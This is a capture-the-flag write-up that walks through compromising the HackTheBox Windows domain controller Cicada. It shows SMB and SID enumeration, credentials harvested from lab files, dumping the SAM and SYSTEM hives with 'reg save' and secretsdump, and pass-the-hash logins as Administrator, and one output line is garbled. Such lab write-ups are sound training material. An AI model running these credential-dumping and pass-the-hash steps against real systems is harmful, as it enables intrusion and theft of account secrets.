---
title: Machine Cicada - HackTheBox
date: 2026-02-04 10:00:00 +0100
categories: [HackTheBox]
tags: [Machines, HackTheBox]
---

![Cicada](/assets/img/posts/Cicada/cicada.png)

## Overview
This is the writeup that describes my journey on Cicada Machine. It's an easy machine with a simple Active Directory environment where you need to enumerate SMB shares, find credentials in cleartext files, perform password spraying, and eventually abuse **SeBackupPrivilege** for privilege escalation.

- Machine: Cicada
- Operating System: Windows
- Key Vulnerabilities: Anonymous SMB Access, Cleartext Credentials, Password in Metadata, SeBackupPrivilege Abuse, Pass-the-Hash.

## Initial Foothold
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada]
└─$ cat nmap.nmap                            
# Nmap 7.98 scan initiated Fri Jan 16 07:21:56 2026 as: /usr/lib/nmap/nmap -sC -sV -oA nmap 10.129.231.149
Nmap scan report for 10.129.231.149
Host is up (0.089s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-16 19:22:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-16T19:23:32+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-01-16T19:23:32+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-16T19:23:32+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-01-16T19:23:32+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.98%I=7%D=1/16%Time=696A2D81%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-16T19:22:55
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```

The scan reveals a Windows Active Directory Domain Controller. Domain identified as `cicada.htb` with SMB (445), LDAP (389), Kerberos (88), and WinRM (5985) open.

## SMB Enumeration

Let's enumerate SMB shares to check for anonymous access:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada]
└─$ smbclient -L 10.129.231.149 --no-pass

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.231.149 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Found two interesting custom shares: **HR** and **DEV**. Attempting guest access on the HR share:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada]
└─$ smbclient \\\\10.129.231.149\\HR
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 459347 blocks available
smb: \> 
```

**Success!** We gained access to the HR share with an empty password (guest access).
We found a suspicious file `Notice from HR.txt`. Let's download it:

```bash
smb: \> get "Notice from HR.txt"
Successfully accessed the HR share with guest credentials! Found auments/Machines/Cicada]
└─$ cat Notice\ from\ HR.txt 

Dear new hire!
Reading the notice:
Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Excellent! Found the default password: **Cicada$M6Corpb*@Lp#nZp!8**

However, we don't have a username. Let's enumerate domain users with impacket-lookupsid:
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada]
└─$ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Found several domain users. After testing the default password, **michael.wrightson** still uses it. Let's use BloodHound to gather more Active Directory information:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ bloodhound-python -d cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -dc 'CICADA-DC.cicada.htb' -c all -ns 10.129.231.149
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: cicada.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: CICADA-DC.cicada.htb
INFO: Testing resolved hostname connectivity dead:beef::c3
INFO: Trying LDAP connection to dead:beef::c3
INFO: Testing resolved hostname connectivity dead:beef::9637:1065:602d:33f4
INFO: Trying LDAP connection to dead:beef::9637:1065:602d:33f4
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: CICADA-DC.cicada.htb
INFO: Testing resolved hostname connectivity dead:beef::c3
INFO: Trying LDAP connection to dead:beef::c3
INFO: Testing resolved hostname connectivity dead:beef::9637:1065:602d:33f4
INFO: Trying LDAP connection to dead:beef::9637:1065:602d:33f4
INFO: Found 9 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CICADA-DC.cicada.htb
INFO: Done in 00M 22S
```

After importing data into BloodHound and analyzing user properties, we discover that **david.orelious** has leaked his password in document metadata:

![metadata](/assets/img/posts/Cicada/metadata.png)

**Critical Finding: Leaked Credentials in Metadata!**

User **david.orelious** has embedded his password in document metadata: **aRt$Lp#7t*VQ!3**
So we have other credentials!
- Username: `david.orelious`
- Password: `aRt$Lp#7t*VQ!3`

Ok, now we can use **crackmapexec** in order to get some important infos:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ crackmapexec winrm cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'

SMB         cicada.htb      5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        cicada.htb      5985   CICADA-DC        [*] http://cicada.htb:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       cicada.htb      5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
                                                                                                                    
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ crackmapexec smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'

SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```

Valid SMB credentials but no WinRM access. Let's enumerate accessible shares:

```bash
──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ crackmapexec smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated shares
SMB         cicada.htb      445    CICADA-DC        Share           Permissions     Remark
SMB         cicada.htb      445    CICADA-DC        -----           -----------     ------
SMB         cicada.htb      445    CICADA-DC        ADMIN$                          Remote Admin
SMB         cicada.htb      445    CICADA-DC        C$                              Default share
SMB         cicada.htb      445    CICADA-DC        DEV             READ            
SMB         cicada.htb      445    CICADA-DC        HR              READ            
SMB         cicada.htb      445    CICADA-DC        IPC$            READ            Remote IPC
SMB         cicada.htb      445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         cicada.htb      445    CICADA-DC        SYSVOL          READ            Logon server share 
```

David has READ access to the **DEV** share. Let's explore it:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 481270 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \> 
```

Found a PowerShell backup script. Let's examine it:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ cat Backup_script.ps1   

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
```

Perfect! Found hardcoded credentials for **emily.oscars**: `Q!3@Lp#M6b*7t*Vt`

## Lateral Movement

Testing emily.oscars credentials with CrackMapExec:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ crackmapexec winrm cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'         
SMB         cicada.htb      5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        cicada.htb      5985   CICADA-DC        [*] http://cicada.htb:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       cicada.htb      5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

Excellent! WinRM access!

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/ActiveDirectory]
└─$ evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 

```

We're IN ! Now in the Desktop
### Capturing User Flag
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> dir

    Directory: C:\Users\emily.oscars.CICADA

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/28/2024  10:32 AM                Desktop
d-r---         8/22/2024   2:22 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir

    Directory: C:\Users\emily.oscars.CICADA\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          2/5/2026  12:49 PM             34 user.txt
```

Let's have a look now for PrivEsc 

## Privilege Escalation

Checking our current privileges:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /user

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
```

emily.oscars has **SeBackupPrivilege** and **SeRestorePrivilege** enabled! This allows us to read any file on the system, including the SAM and SYSTEM registry hives containing password hashes.

Reference: [SeBackupPrivilege Abuse Technique](https://medium.com/@vaibbhav_08/part-2-sebackupprivilege-the-backup-trick-attackers-love-1bb7ad8a8aff)

Let's extract the SAM and SYSTEM hives:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system C:\Temp\system
reg.exe : ERROR: The system was unable to find the specified registry key or value.
    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> exit
                                        
Info: Exiting with code 0
```

Successfully downloaded the SAM and SYSTEM hives. Now let's extract password hashes using impacket-secretsdump:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/post_expl]
└─$ impacket-secretsdump -sam sam -system system local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

Perfect! Extracted the Administrator NTLM hash: **2b87e7c93a3e8a0ea4a581937016f341**

Now we can use Pass-the-Hash to authenticate as Administrator without cracking the password:

```bash
┌──(kali㉿kali)-[~/Documents/Machines/Cicada/post_expl]
└─$ evil-winrm -i cicada.htb -u 'Administrator' -H 2b87e7c93a3e8a0ea4a581937016f341
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```

**Root flag captured!**

## Conclusion

This machine demonstrated several important security concepts:

1. **Anonymous SMB Access**: Guest access to HR and DEV shares allowed unauthorized access to sensitive documents
2. **Cleartext Credentials Storage**: Default passwords in HR notices and hardcoded credentials in PowerShell scripts
3. **Password in Metadata**: User credentials leaked through document metadata (david.orelious)
4. **SeBackupPrivilege Abuse**: Leveraged backup privileges to extract SAM and SYSTEM hives for password hash retrieval
5. **Pass-the-Hash Attack**: Used NTLM hash directly to authenticate as Administrator without cracking

Key takeaways:
- **Disable guest access** on SMB shares and implement proper ACLs
- **Never store passwords in cleartext** - use secure credential stores
- **Strip metadata** from documents before sharing them
- **Limit SeBackupPrivilege** to only backup service accounts and monitor its usage
- **Disable NTLM authentication** where possible and enforce Kerberos with AES encryption
- **Monitor sensitive operations** like `reg save` commands and unusual privilege usage